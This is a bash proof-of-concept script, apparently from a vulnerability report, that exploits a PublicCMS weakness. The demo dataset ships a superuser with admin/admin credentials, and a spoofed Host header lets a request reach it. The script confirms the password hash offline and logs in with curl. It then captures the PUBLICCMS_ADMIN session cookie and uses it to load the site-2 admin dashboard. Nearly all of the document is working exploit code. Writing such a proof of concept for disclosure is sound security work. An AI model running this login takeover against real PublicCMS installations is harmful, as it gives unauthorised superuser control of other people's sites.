#!/usr/bin/env bash
# VULN-001 — Bundled demo default-credential superuser via Host header
#
# The demo dataset (publiccms.sql, imported with useSimple=true) inserts a
# second sys_user: id=2, site_id=2, superuser=1, disabled=0, password salt.hash
# with salt "0123456789". The stored hash equals sha512(sha512("admin")+salt),
# i.e. the credential is admin/admin. Site selection trusts the Host header, and
# /admin/login is site-scoped (findByName(site.getId(), username)), so sending
# Host: site2.dev.publiccms.com resolves site 2 and authenticates the demo
# superuser with admin/admin — an unauthenticated single-request takeover.
#
# CONFIRMED when: (a) the crafted login returns 302 + a PUBLICCMS_ADMIN cookie
# whose id prefix is 2 (the demo superuser), and (b) that cookie renders the
# site-2 management dashboard (HTTP 200).
#
# Safe/read-only: this script only authenticates and READS the dashboard. It
# performs no writes as the superuser. Idempotent — leaves no server state.
set -u
BASE_URL="${BASE_URL:-http://localhost:20000}"
VHOST="${VHOST:-site2.dev.publiccms.com}"
USER="${USER_NAME:-admin}"
PASS="${PASS:-admin}"
OUT="$(cd "$(dirname "$0")" && pwd)"

echo "[INFO] VULN-001: default-cred demo superuser (admin/admin) via Host: $VHOST"

# --- 0. Proof the credential derivation (offline hash crack) -----------------
STORED='0123456789.2134b56595c73a647716b0a8e33f9d50243fb1c1a088597ba5aa6d9ccadacbd8fc8307bda2adfc8362abe611420bd48263bdcfd91c1c26566ad3a29d79cffd9c'
CALC=$(python3 -c "import hashlib;print('0123456789.'+hashlib.sha512((hashlib.sha512(b'admin').hexdigest()+'0123456789').encode()).hexdigest())")
if [ "$CALC" = "$STORED" ]; then
  echo "[SETUP] hash-crack: sha512(sha512('admin')+salt) == shipped hash  -> credential is admin/admin"
else
  echo "[WARN] offline hash derivation did not match shipped hash (still testing live login)"
fi

# --- 1. Craft the unauthenticated login with the attacker Host header --------
echo "[STEP] POST $BASE_URL/admin/login  (Host: $VHOST, username=$USER password=$PASS)"
HDRS=$(curl -s -D - -o /dev/null -H "Host: $VHOST" \
  --data "username=${USER}&password=${PASS}" "$BASE_URL/admin/login")
printf '%s\n' "$HDRS" > "$OUT/response.txt"

CODE=$(printf '%s' "$HDRS" | grep -iE '^HTTP/' | head -1 | awk '{print $2}')
COOKIE=$(printf '%s' "$HDRS" | grep -i 'set-cookie: PUBLICCMS_ADMIN' | sed -E 's/.*PUBLICCMS_ADMIN=([^;]+);.*/\1/')
echo "[INFO] login status=$CODE  cookie=${COOKIE:-<none>}"

if [ "$CODE" != "302" ] || [ -z "$COOKIE" ]; then
  echo "[FAIL] login did not return 302 + PUBLICCMS_ADMIN cookie"; exit 1
fi
# demo superuser is user id 2 -> cookie is "2_<uuid>"
UID_PREFIX="${COOKIE%%_*}"
if [ "$UID_PREFIX" != "2" ]; then
  echo "[FAIL] authenticated as user id $UID_PREFIX, expected demo superuser id 2"; exit 1
fi
echo "[OK] authenticated as demo superuser (user id 2) with no operator-set credential"

# --- 2. Reuse the session to render the site-2 admin dashboard ---------------
echo "[STEP] GET $BASE_URL/admin/index with captured cookie"
DASH=$(curl -s -b "PUBLICCMS_ADMIN=$COOKIE" -H "Host: $VHOST" \
  -w '\n__HTTP__%{http_code}' "$BASE_URL/admin/index")
DCODE="${DASH##*__HTTP__}"; DBODY="${DASH%__HTTP__*}"
printf '%s' "$DBODY" > "$OUT/evidence/dashboard.html"
echo "[INFO] dashboard status=$DCODE"

if [ "$DCODE" = "200" ] && printf '%s' "$DBODY" | grep -qi 'Management system'; then
  echo "[OK] exploit confirmed — unauthenticated superuser session on site 2 (dashboard rendered)"
  printf '%s' "$DBODY" | grep -oiE '<title>[^<]*</title>' | head -1
  exit 0
else
  echo "[FAIL] dashboard did not render as an authenticated superuser (status=$DCODE)"; exit 1
fi
